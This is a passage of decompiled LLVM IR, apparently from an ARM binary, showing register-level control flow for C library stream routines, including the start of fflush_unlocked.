dec_label_pc_2b818:                               ; preds = %dec_label_pc_2b804, %dec_label_pc_2b818.dec_label_pc_2b80c_crit_edge
  %v0_2b81890 = phi i32 [ %v1_2b810.pre, %dec_label_pc_2b818.dec_label_pc_2b80c_crit_edge ], [ 0, %dec_label_pc_2b804 ]
  store i32 %v0_2b81890, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_2b828 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_2b828, label %dec_label_pc_2b82c, label %dec_label_pc_2b818.dec_label_pc_2b80c_crit_edge

dec_label_pc_2b818.dec_label_pc_2b80c_crit_edge:  ; preds = %dec_label_pc_2b818
  %v0_2b80c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_2b810.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_2b80c = inttoptr i32 %v0_2b80c.pre to i32*
  %v2_2b80c = load i32, i32* %v1_2b80c, align 4
  store i32 %v2_2b80c, i32* %r3.global-to-local, align 4
  %v3_2b810 = icmp uge i32 %v2_2b80c, %v1_2b810.pre
  store i1 %v3_2b810, i1* %cpsr_c.global-to-local, align 1
  %v9_2b810 = icmp eq i32 %v2_2b80c, %v1_2b810.pre
  br i1 %v9_2b810, label %dec_label_pc_2b818, label %dec_label_pc_2b830

dec_label_pc_2b82c:                               ; preds = %dec_label_pc_2b818
  %v0_2b82c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_2b82c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_2b830

dec_label_pc_2b830:                               ; preds = %dec_label_pc_2b804, %dec_label_pc_2b818.dec_label_pc_2b80c_crit_edge, %dec_label_pc_2b82c
  %v0_2b830 = phi i32 [ %v0_2b82c, %dec_label_pc_2b82c ], [ %v2_2b80c87, %dec_label_pc_2b804 ], [ %v2_2b80c, %dec_label_pc_2b818.dec_label_pc_2b80c_crit_edge ]
  %v1_2b830 = phi i32 [ %v0_2b82c, %dec_label_pc_2b82c ], [ 0, %dec_label_pc_2b804 ], [ %v1_2b810.pre, %dec_label_pc_2b818.dec_label_pc_2b80c_crit_edge ]
  %v3_2b830 = icmp uge i32 %v0_2b830, %v1_2b830
  store i1 %v3_2b830, i1* %cpsr_c.global-to-local, align 1
  %v9_2b830 = icmp eq i32 %v0_2b830, %v1_2b830
  br i1 %v9_2b830, label %bb48, label %bb47

bb47:                                             ; preds = %dec_label_pc_2b830
  %v1_2b834 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_2b834, i32* %r0.global-to-local, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_2b830, %bb47
  %v1_2b838 = xor i1 %v9_2b830, true
  call void @__pseudo_cond_branch(i1 %v1_2b838, i32 ptrtoint (i32* @global_var_27dec.3092 to i32))
  %v0_2b83c = load i32, i32* %r6.global-to-local, align 4
  %v1_2b83c = load i32, i32* %r7.global-to-local, align 4
  %v2_2b83c = add i32 %v1_2b83c, 8
  %v3_2b83c = inttoptr i32 %v2_2b83c to i32*
  store i32 %v0_2b83c, i32* %v3_2b83c, align 4
  %v0_2b848.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_2b840

dec_label_pc_2b840:                               ; preds = %dec_label_pc_2b7f0, %bb48
  %v0_2b848 = phi i32 [ %v0_2b7e0, %dec_label_pc_2b7f0 ], [ %v0_2b848.pre, %bb48 ]
  store i32 168, i32* %r3.global-to-local, align 4
  store i32 88, i32* %r1.global-to-local, align 4
  %v2_2b848 = add i32 %v0_2b848, 168
  %v3_2b848 = inttoptr i32 %v2_2b848 to i32*
  %v4_2b848 = load i32, i32* %v3_2b848, align 4
  store i32 %v4_2b848, i32* %r0.global-to-local, align 4
  %v2_2b84c = add i32 %v0_2b848, 88
  %v3_2b84c = inttoptr i32 %v2_2b84c to i32*
  %v4_2b84c = load i32, i32* %v3_2b84c, align 4
  store i32 %v4_2b84c, i32* %r2.global-to-local, align 4
  %v1_2b850 = add i32 %v4_2b848, 4
  %v2_2b850 = inttoptr i32 %v1_2b850 to i32*
  %v3_2b850 = load i32, i32* %v2_2b850, align 4
  store i32 %v3_2b850, i32* %r3.global-to-local, align 4
  %v1_2b854 = inttoptr i32 %v4_2b84c to i32*
  %v2_2b854 = load i32, i32* %v1_2b854, align 4
  store i32 %v2_2b854, i32* %r2.global-to-local, align 4
  %v1_2b858 = add i32 %v3_2b850, 1
  store i32 %v1_2b858, i32* %r3.global-to-local, align 4
  store i32 88, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v1_2b858, i32* %v2_2b850, align 4
  %v0_2b8a8.pr = load i32, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_2b8a811 = icmp eq i32 %v0_2b8a8.pr, 0
  store i32 32816, i32* %r1.global-to-local, align 4
  br i1 %v2_2b8a811, label %dec_label_pc_2b8b4, label %dec_label_pc_2b86c

dec_label_pc_2b86c:                               ; preds = %dec_label_pc_2b840, %dec_label_pc_2b8a4
  %v0_2b8902 = phi i32 [ %v0_2b8a4, %dec_label_pc_2b8a4 ], [ %v0_2b8a8.pr, %dec_label_pc_2b840 ]
  %v1_2b86c = inttoptr i32 %v0_2b8902 to i16*
  %v2_2b86c = load i16, i16* %v1_2b86c, align 2
  %v3_2b86c = zext i16 %v2_2b86c to i32
  store i32 %v3_2b86c, i32* %r3.global-to-local, align 4
  %v2_2b870 = and i32 %v3_2b86c, 32816
  store i32 %v2_2b870, i32* %r1.global-to-local, align 4
  %v2_2b874 = icmp ugt i32 %v2_2b870, 47
  store i1 %v2_2b874, i1* %cpsr_c.global-to-local, align 1
  %v7_2b874 = icmp eq i32 %v2_2b870, 48
  %v1_2b878 = add i32 %v0_2b8902, 32
  %v2_2b878 = inttoptr i32 %v1_2b878 to i32*
  %v3_2b878 = load i32, i32* %v2_2b878, align 4
  store i32 %v3_2b878, i32* %r4.global-to-local, align 4
  br i1 %v7_2b874, label %dec_label_pc_2b884, label %.thread38

.thread38:                                        ; preds = %dec_label_pc_2b86c
  store i32 %v0_2b8902, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_2b8a4

dec_label_pc_2b884:                               ; preds = %dec_label_pc_2b86c
  %v0_2b884 = load i32, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_2b884 = icmp eq i32 %v0_2b884, 0
  br i1 %v2_2b884, label %.thread, label %bb49

.thread:                                          ; preds = %dec_label_pc_2b884
  %v1_2b888 = load i32, i32* %r5.global-to-local, align 4
  %v2_2b888 = load i32, i32* %r7.global-to-local, align 4
  %v3_2b888 = add i32 %v2_2b888, %v1_2b888
  %v4_2b888 = inttoptr i32 %v3_2b888 to i32*
  %v5_2b888 = load i32, i32* %v4_2b888, align 4
  store i32 %v5_2b888, i32* %r3.global-to-local, align 4
  %v3_2b88c = inttoptr i32 %v5_2b888 to i32*
  store i32 %v3_2b878, i32* %v3_2b88c, align 4
  %v0_2b890 = load i32, i32* %r2.global-to-local, align 4
  %v1_2b890 = inttoptr i32 %v0_2b890 to i16*
  %v2_2b890 = load i16, i16* %v1_2b890, align 2
  %v3_2b890 = zext i16 %v2_2b890 to i32
  store i32 %v3_2b890, i32* %r3.global-to-local, align 4
  br label %bb50

bb49:                                             ; preds = %dec_label_pc_2b884
  %v2_2b8908 = load i16, i16* %v1_2b86c, align 2
  %v3_2b8909 = zext i16 %v2_2b8908 to i32
  store i32 %v3_2b8909, i32* %r3.global-to-local, align 4
  %v3_2b894 = add i32 %v0_2b884, 32
  %v4_2b894 = inttoptr i32 %v3_2b894 to i32*
  store i32 %v3_2b878, i32* %v4_2b894, align 4
  %v0_2b898.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb50

bb50:                                             ; preds = %.thread, %bb49
  %v0_2b898 = phi i32 [ %v3_2b890, %.thread ], [ %v0_2b898.pre, %bb49 ]
  %v1_2b898 = and i32 %v0_2b898, 8192
  %v2_2b898 = icmp eq i32 %v1_2b898, 0
  br i1 %v2_2b898, label %bb52, label %bb51

bb51:                                             ; preds = %bb50
  %v1_2b89c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_2b89c, i32* %r0.global-to-local, align 4
  br label %bb52

bb52:                                             ; preds = %bb50, %bb51
  %v1_2b8a0 = xor i1 %v2_2b898, true
  call void @__pseudo_cond_branch(i1 %v1_2b8a0, i32 ptrtoint (i32* @global_var_264e8.3412 to i32))
  %v0_2b8a4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_2b8a4

dec_label_pc_2b8a4:                               ; preds = %.thread38, %bb52
  %v0_2b8a4 = phi i32 [ %v0_2b8a4.pre, %bb52 ], [ %v3_2b878, %.thread38 ]
  store i32 %v0_2b8a4, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_2b8a8 = icmp eq i32 %v0_2b8a4, 0
  store i32 32816, i32* %r1.global-to-local, align 4
  br i1 %v2_2b8a8, label %dec_label_pc_2b8b4, label %dec_label_pc_2b86c

dec_label_pc_2b8b4:                               ; preds = %dec_label_pc_2b8a4, %dec_label_pc_2b840
  store i32 168, i32* %r3.global-to-local, align 4
  %v0_2b8b8 = load i32, i32* %r5.global-to-local, align 4
  %v2_2b8b8 = add i32 %v0_2b8b8, 168
  %v3_2b8b8 = inttoptr i32 %v2_2b8b8 to i32*
  %v4_2b8b8 = load i32, i32* %v3_2b8b8, align 4
  store i32 %v4_2b8b8, i32* %r0.global-to-local, align 4
  %v1_2b8bc = add i32 %v4_2b8b8, 4
  %v2_2b8bc = inttoptr i32 %v1_2b8bc to i32*
  %v3_2b8bc = load i32, i32* %v2_2b8bc, align 4
  %v1_2b8c0 = add i32 %v3_2b8bc, -1
  store i32 %v1_2b8c0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_2b8c4 = icmp eq i32 %v1_2b8c0, 0
  store i32 %v1_2b8c0, i32* %v2_2b8bc, align 4
  br i1 %v2_2b8c4, label %dec_label_pc_2b8d0, label %dec_label_pc_2b930

dec_label_pc_2b8d0:                               ; preds = %dec_label_pc_2b8b4
  %v0_2b8d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_2b8d0 = load i32, i32* %r0.global-to-local, align 4
  %v2_2b8d0 = add i32 %v1_2b8d0, 8
  %v3_2b8d0 = inttoptr i32 %v2_2b8d0 to i32*
  store i32 %v0_2b8d0, i32* %v3_2b8d0, align 4
  %v0_2b8d4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_2b8d4, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_2b8d8

dec_label_pc_2b8d8:                               ; preds = %dec_label_pc_2b908.dec_label_pc_2b8d8_crit_edge, %dec_label_pc_2b8d0
  %v0_2b8d8 = phi i32 [ %v0_2b8d8.pre, %dec_label_pc_2b908.dec_label_pc_2b8d8_crit_edge ], [ %v0_2b8d4, %dec_label_pc_2b8d0 ]
  %v1_2b8d8 = inttoptr i32 %v0_2b8d8 to i32*
  %v2_2b8d8 = load i32, i32* %v1_2b8d8, align 4
  store i32 %v2_2b8d8, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_2b8d8, i32* %r2.global-to-local, align 4
  %v2_2b8e474 = load i32, i32* %v1_2b8d8, align 4
  store i32 %v2_2b8e474, i32* %r3.global-to-local, align 4
  %v3_2b8e876 = icmp uge i32 %v2_2b8e474, %v2_2b8d8
  store i1 %v3_2b8e876, i1* %cpsr_c.global-to-local, align 1
  %v9_2b8e882 = icmp eq i32 %v2_2b8e474, %v2_2b8d8
  br i1 %v9_2b8e882, label %dec_label_pc_2b8f0, label %dec_label_pc_2b908

dec_label_pc_2b8f0:                               ; preds = %dec_label_pc_2b8d8, %dec_label_pc_2b8f0.dec_label_pc_2b8e4_crit_edge
  %v0_2b8f083 = phi i32 [ %v1_2b8e8.pre, %dec_label_pc_2b8f0.dec_label_pc_2b8e4_crit_edge ], [ %v2_2b8d8, %dec_label_pc_2b8d8 ]
  store i32 %v0_2b8f083, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_2b900 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_2b900, label %dec_label_pc_2b904, label %dec_label_pc_2b8f0.dec_label_pc_2b8e4_crit_edge

dec_label_pc_2b8f0.dec_label_pc_2b8e4_crit_edge:  ; preds = %dec_label_pc_2b8f0
  %v0_2b8e4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_2b8e8.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_2b8e4 = inttoptr i32 %v0_2b8e4.pre to i32*
  %v2_2b8e4 = load i32, i32* %v1_2b8e4, align 4
  store i32 %v2_2b8e4, i32* %r3.global-to-local, align 4
  %v3_2b8e8 = icmp uge i32 %v2_2b8e4, %v1_2b8e8.pre
  store i1 %v3_2b8e8, i1* %cpsr_c.global-to-local, align 1
  %v9_2b8e8 = icmp eq i32 %v2_2b8e4, %v1_2b8e8.pre
  br i1 %v9_2b8e8, label %dec_label_pc_2b8f0, label %dec_label_pc_2b908

dec_label_pc_2b904:                               ; preds = %dec_label_pc_2b8f0
  %v0_2b904 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_2b904, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_2b908

dec_label_pc_2b908:                               ; preds = %dec_label_pc_2b8d8, %dec_label_pc_2b8f0.dec_label_pc_2b8e4_crit_edge, %dec_label_pc_2b904
  %v0_2b910 = phi i32 [ %v0_2b904, %dec_label_pc_2b904 ], [ %v2_2b8e474, %dec_label_pc_2b8d8 ], [ %v2_2b8e4, %dec_label_pc_2b8f0.dec_label_pc_2b8e4_crit_edge ]
  %v1_2b908 = phi i32 [ %v0_2b904, %dec_label_pc_2b904 ], [ %v2_2b8d8, %dec_label_pc_2b8d8 ], [ %v1_2b8e8.pre, %dec_label_pc_2b8f0.dec_label_pc_2b8e4_crit_edge ]
  %v3_2b908 = icmp uge i32 %v0_2b910, %v1_2b908
  store i1 %v3_2b908, i1* %cpsr_c.global-to-local, align 1
  %v9_2b908 = icmp eq i32 %v0_2b910, %v1_2b908
  br i1 %v9_2b908, label %dec_label_pc_2b910, label %dec_label_pc_2b908.dec_label_pc_2b8d8_crit_edge

dec_label_pc_2b908.dec_label_pc_2b8d8_crit_edge:  ; preds = %dec_label_pc_2b908
  %v0_2b8d8.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_2b8d8

dec_label_pc_2b910:                               ; preds = %dec_label_pc_2b908
  %v2_2b910 = icmp ne i32 %v1_2b908, 0
  store i1 %v2_2b910, i1* %cpsr_c.global-to-local, align 1
  %v7_2b914 = icmp slt i32 %v1_2b908, 2
  br i1 %v7_2b914, label %dec_label_pc_2b930, label %dec_label_pc_2b918

dec_label_pc_2b918:                               ; preds = %dec_label_pc_2b910
  %v0_2b918 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_2b918, i32* %r0.global-to-local, align 4
  %v0_2b91c = load i32, i32* %r1.global-to-local, align 4
  %v1_2b91c = add i32 %v0_2b91c, 129
  store i32 %v1_2b91c, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_2b930

dec_label_pc_2b930:                               ; preds = %dec_label_pc_2b8b4, %dec_label_pc_2b918, %dec_label_pc_2b910
  store i32 92, i32* %r3.global-to-local, align 4
  %v0_2b934 = load i32, i32* %r5.global-to-local, align 4
  %v2_2b934 = add i32 %v0_2b934, 92
  %v3_2b934 = inttoptr i32 %v2_2b934 to i32*
  %v4_2b934 = load i32, i32* %v3_2b934, align 4
  store i32 %v4_2b934, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_2b93c = inttoptr i32 %v4_2b934 to i32*
  store i32 0, i32* %v2_2b93c, align 4
  br label %dec_label_pc_2b940

dec_label_pc_2b940:                               ; preds = %dec_label_pc_2b7b4, %dec_label_pc_2b7dc, %dec_label_pc_2b930
  store i32 176, i32* %r3.global-to-local, align 4
  %v0_2b944 = load i32, i32* %r5.global-to-local, align 4
  %v2_2b944 = add i32 %v0_2b944, 176
  %v3_2b944 = inttoptr i32 %v2_2b944 to i32*
  %v4_2b944 = load i32, i32* %v3_2b944, align 4
  store i32 %v4_2b944, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_2b94c = add i32 %v0_2b944, 12
  %v3_2b94c = inttoptr i32 %v2_2b94c to i32*
  %v4_2b94c = load i32, i32* %v3_2b94c, align 4
  store i32 %v4_2b94c, i32* %r1.global-to-local, align 4
  %v1_2b950 = add i32 %v4_2b944, 4
  %v2_2b950 = inttoptr i32 %v1_2b950 to i32*
  %v3_2b950 = load i32, i32* %v2_2b950, align 4
  store i32 %v3_2b950, i32* %r2.global-to-local, align 4
  %v1_2b954 = inttoptr i32 %v4_2b94c to i32*
  %v2_2b954 = load i32, i32* %v1_2b954, align 4
  %v1_2b958 = add i32 %v3_2b950, -1
  store i32 %v1_2b958, i32* %r2.global-to-local, align 4
  %v1_2b95c = add i32 %v2_2b954, -1
  store i32 %v1_2b95c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_2b960 = icmp eq i32 %v1_2b958, 0
  store i32 %v1_2b95c, i32* %v1_2b954, align 4
  %v0_2b968 = load i32, i32* %r2.global-to-local, align 4
  %v1_2b968 = load i32, i32* %r0.global-to-local, align 4
  %v2_2b968 = add i32 %v1_2b968, 4
  %v3_2b968 = inttoptr i32 %v2_2b968 to i32*
  store i32 %v0_2b968, i32* %v3_2b968, align 4
  br i1 %v2_2b960, label %dec_label_pc_2b970, label %dec_label_pc_2b9d0

dec_label_pc_2b970:                               ; preds = %dec_label_pc_2b940
  %v0_2b970 = load i32, i32* %r2.global-to-local, align 4
  %v1_2b970 = load i32, i32* %r0.global-to-local, align 4
  %v2_2b970 = add i32 %v1_2b970, 8
  %v3_2b970 = inttoptr i32 %v2_2b970 to i32*
  store i32 %v0_2b970, i32* %v3_2b970, align 4
  %v0_2b974 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_2b974, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_2b978

dec_label_pc_2b978:                               ; preds = %dec_label_pc_2b9a8.dec_label_pc_2b978_crit_edge, %dec_label_pc_2b970
  %v0_2b978 = phi i32 [ %v0_2b978.pre, %dec_label_pc_2b9a8.dec_label_pc_2b978_crit_edge ], [ %v0_2b974, %dec_label_pc_2b970 ]
  %v1_2b978 = inttoptr i32 %v0_2b978 to i32*
  %v2_2b978 = load i32, i32* %v1_2b978, align 4
  store i32 %v2_2b978, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_2b978, i32* %r2.global-to-local, align 4
  %v2_2b98462 = load i32, i32* %v1_2b978, align 4
  store i32 %v2_2b98462, i32* %r3.global-to-local, align 4
  %v3_2b98864 = icmp uge i32 %v2_2b98462, %v2_2b978
  store i1 %v3_2b98864, i1* %cpsr_c.global-to-local, align 1
  %v9_2b98870 = icmp eq i32 %v2_2b98462, %v2_2b978
  br i1 %v9_2b98870, label %dec_label_pc_2b990, label %dec_label_pc_2b9a8

dec_label_pc_2b990:                               ; preds = %dec_label_pc_2b978, %dec_label_pc_2b990.dec_label_pc_2b984_crit_edge
  %v0_2b99071 = phi i32 [ %v1_2b988.pre, %dec_label_pc_2b990.dec_label_pc_2b984_crit_edge ], [ %v2_2b978, %dec_label_pc_2b978 ]
  store i32 %v0_2b99071, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_2b9a0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_2b9a0, label %dec_label_pc_2b9a4, label %dec_label_pc_2b990.dec_label_pc_2b984_crit_edge

dec_label_pc_2b990.dec_label_pc_2b984_crit_edge:  ; preds = %dec_label_pc_2b990
  %v0_2b984.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_2b988.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_2b984 = inttoptr i32 %v0_2b984.pre to i32*
  %v2_2b984 = load i32, i32* %v1_2b984, align 4
  store i32 %v2_2b984, i32* %r3.global-to-local, align 4
  %v3_2b988 = icmp uge i32 %v2_2b984, %v1_2b988.pre
  store i1 %v3_2b988, i1* %cpsr_c.global-to-local, align 1
  %v9_2b988 = icmp eq i32 %v2_2b984, %v1_2b988.pre
  br i1 %v9_2b988, label %dec_label_pc_2b990, label %dec_label_pc_2b9a8

dec_label_pc_2b9a4:                               ; preds = %dec_label_pc_2b990
  %v0_2b9a4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_2b9a4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_2b9a8

dec_label_pc_2b9a8:                               ; preds = %dec_label_pc_2b978, %dec_label_pc_2b990.dec_label_pc_2b984_crit_edge, %dec_label_pc_2b9a4
  %v0_2b9b0 = phi i32 [ %v0_2b9a4, %dec_label_pc_2b9a4 ], [ %v2_2b98462, %dec_label_pc_2b978 ], [ %v2_2b984, %dec_label_pc_2b990.dec_label_pc_2b984_crit_edge ]
  %v1_2b9a8 = phi i32 [ %v0_2b9a4, %dec_label_pc_2b9a4 ], [ %v2_2b978, %dec_label_pc_2b978 ], [ %v1_2b988.pre, %dec_label_pc_2b990.dec_label_pc_2b984_crit_edge ]
  %v3_2b9a8 = icmp uge i32 %v0_2b9b0, %v1_2b9a8
  store i1 %v3_2b9a8, i1* %cpsr_c.global-to-local, align 1
  %v9_2b9a8 = icmp eq i32 %v0_2b9b0, %v1_2b9a8
  br i1 %v9_2b9a8, label %dec_label_pc_2b9b0, label %dec_label_pc_2b9a8.dec_label_pc_2b978_crit_edge

dec_label_pc_2b9a8.dec_label_pc_2b978_crit_edge:  ; preds = %dec_label_pc_2b9a8
  %v0_2b978.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_2b978

dec_label_pc_2b9b0:                               ; preds = %dec_label_pc_2b9a8
  %v2_2b9b0 = icmp ne i32 %v1_2b9a8, 0
  store i1 %v2_2b9b0, i1* %cpsr_c.global-to-local, align 1
  %v7_2b9b4 = icmp slt i32 %v1_2b9a8, 2
  br i1 %v7_2b9b4, label %dec_label_pc_2b9d0, label %dec_label_pc_2b9b8

dec_label_pc_2b9b8:                               ; preds = %dec_label_pc_2b9b0
  %v0_2b9b8 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_2b9b8, i32* %r0.global-to-local, align 4
  %v0_2b9bc = load i32, i32* %r1.global-to-local, align 4
  %v1_2b9bc = add i32 %v0_2b9bc, 129
  store i32 %v1_2b9bc, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_2b9d0

dec_label_pc_2b9d0:                               ; preds = %dec_label_pc_2b940, %dec_label_pc_2b9b8, %dec_label_pc_2b9b0
  %v2_2b9d4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_2b9d4, i32* %r4.global-to-local, align 4
  %v1_2b9d8 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_2b9d8

; uselistorder directives
  uselistorder i32 %v0_2b9a4, { 1, 0, 2 }
  uselistorder i32 %v1_2b988.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_2b978, { 1, 0 }
  uselistorder i32 %v0_2b904, { 1, 0, 2 }
  uselistorder i32 %v1_2b8e8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_2b8d8, { 1, 0 }
  uselistorder i32 %v0_2b8a4, { 2, 1, 0 }
  uselistorder i32 %v0_2b848, { 1, 0 }
  uselistorder i32 %v0_2b82c, { 1, 0, 2 }
  uselistorder i32 %v1_2b810.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_2b7fc, { 1, 0 }
  uselistorder i32 %v0_2b7a0, { 1, 0, 2 }
  uselistorder i32 %v1_2b784.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_2b758, { 2, 1, 0, 3 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3, 4, 6, 5, 7, 8, 9, 11, 10, 12, 14, 13, 15 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 5, 4, 6, 7, 8, 10, 9, 11, 13, 12, 14 }
  uselistorder i32* %r3.global-to-local, { 4, 5, 7, 6, 0, 8, 9, 10, 11, 12, 13, 14, 16, 15, 1, 17, 18, 19, 43, 44, 20, 21, 22, 23, 24, 25, 26, 28, 27, 2, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 40, 39, 3, 41, 42 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 9, 8, 0, 10, 11, 12 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i1* %cpsr_c.global-to-local, { 5, 6, 8, 7, 1, 9, 10, 11, 13, 12, 2, 14, 17, 15, 16, 0, 18, 20, 19, 3, 21, 22, 23, 24, 26, 25, 4, 27 }
  uselistorder i32 47, { 3, 1, 6, 0, 4, 5, 2 }
  uselistorder i32 32816, { 2, 0, 1 }
  uselistorder label %dec_label_pc_2b9d0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_2b9a8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_2b990, { 1, 0 }
  uselistorder label %dec_label_pc_2b940, { 2, 1, 0 }
  uselistorder label %dec_label_pc_2b930, { 1, 2, 0 }
  uselistorder label %dec_label_pc_2b908, { 2, 1, 0 }
  uselistorder label %dec_label_pc_2b8f0, { 1, 0 }
  uselistorder label %dec_label_pc_2b8a4, { 1, 0 }
  uselistorder label %bb52, { 1, 0 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %dec_label_pc_2b86c, { 1, 0 }
  uselistorder label %dec_label_pc_2b840, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %dec_label_pc_2b830, { 2, 1, 0 }
  uselistorder label %dec_label_pc_2b818, { 1, 0 }
  uselistorder label %dec_label_pc_2b7b4, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %dec_label_pc_2b7a4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_2b78c, { 1, 0 }
}

define i32 @function_2b9e0(i16* %arg1) local_unnamed_addr {
dec_label_pc_2b9e0:
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_2b9e0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_2b9e0, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_2b9e0
  %v2_2b9e0 = trunc i32 %tmp to i16
  store i16 %v2_2b9e0, i16* %arg1, align 2
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_2b9e0, %bb
  %v10_2b9f4 = phi i32 [ %tmp, %dec_label_pc_2b9e0 ], [ 0, %bb ]
  ret i32 %v10_2b9f4

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %v6_2b9f8 = load i32, i32* @r5, align 4
  store i32 88, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* @r6, align 4
  %v4_2ba08 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 88) to i32*), align 4
  store i32 %v4_2ba08, i32* %r3.global-to-local, align 4
  %v4_2ba0c = icmp uge i32 %tmp, %v4_2ba08
  store i1 %v4_2ba0c, i1* %cpsr_c.global-to-local, align 1
  %v10_2ba0c = icmp eq i32 %tmp, %v4_2ba08
  br i1 %v10_2ba0c, label %bb, label %dec_label_pc_2ba24

bb:                                               ; preds = %entry
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  br label %dec_label_pc_2ba34

dec_label_pc_2ba24:                               ; preds = %entry
  store i32 %tmp, i32* @r4, align 4
  store i32 256, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_2ba28 = icmp eq i16* %arg1, null
  br i1 %v3_2ba28, label %dec_label_pc_2ba34, label %dec_label_pc_2bd48

dec_label_pc_2ba34:                               ; preds = %bb, %dec_label_pc_2ba24
